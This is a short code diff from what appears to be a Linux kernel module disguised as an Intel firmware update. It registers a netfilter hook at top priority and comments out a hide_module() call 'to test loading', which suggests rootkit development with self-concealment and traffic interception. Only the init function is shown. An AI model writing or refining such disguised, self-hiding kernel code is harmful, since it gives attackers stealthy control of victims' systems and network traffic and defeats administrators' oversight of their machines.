@@ -124,7 +124,7 @@ static int __init intel_fw_update_init(void)
     nfho.priority = INT_MIN;
 
     nf_register_net_hook(&init_net, &nfho);
-    hide_module();
+    // hide_module();  // Temporarily commented out to test loading
     return 0;
 }
 
